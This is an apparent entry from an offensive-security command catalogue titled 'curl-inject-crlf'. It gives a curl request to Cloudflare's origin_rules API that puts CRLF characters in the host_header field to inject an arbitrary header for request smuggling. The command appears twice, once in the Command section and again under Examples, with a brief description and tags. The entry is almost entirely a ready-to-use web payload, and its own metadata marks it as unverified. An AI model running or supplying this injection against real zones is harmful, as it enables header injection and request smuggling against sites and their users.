---
data: >-
  curl -X POST
  'https://api.cloudflare.com/client/v4/zones/{zone_id}/origin_rules' -H
  'Authorization: Bearer {api_token}' -H 'Content-Type: application/json' --data
  '{"action_parameters": {"host_header": "example.com\r\nX-Injected-Header:
  malicious-value"}}'
tags:
  - crlf-injection
  - cloudflare
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 17409b2e-a074-4577-833d-ea01bbfbba7b
created_at: '2025-12-13T09:01:22.247Z'
updated_at: '2025-12-13T09:01:22.247Z'
verified: false
validated: true
submitted: true
---
# curl-inject-crlf

## Command

```bash
curl -X POST 'https://api.cloudflare.com/client/v4/zones/{zone_id}/origin_rules' \
  -H 'Authorization: Bearer {api_token}' \
  -H 'Content-Type: application/json' \
  --data '{"action_parameters": {"host_header": "example.com\r\nX-Injected-Header: malicious-value"}}'
```

## Description

Injects CRLF characters into the host_header to add arbitrary headers for smuggling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data` | JSON with CRLF in host_header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.cloudflare.com/client/v4/zones/{zone_id}/origin_rules' \
  -H 'Authorization: Bearer {api_token}' \
  -H 'Content-Type: application/json' \
  --data '{"action_parameters": {"host_header": "example.com\r\nX-Injected-Header: value"}}'
```

## Expected Output

Successful rule creation response.

## Related

- [[commands/curl-api-request]]
- [[procedures/Inject-Arbitrary-Headers-Using-CRLF-in-Origin-Rules]]
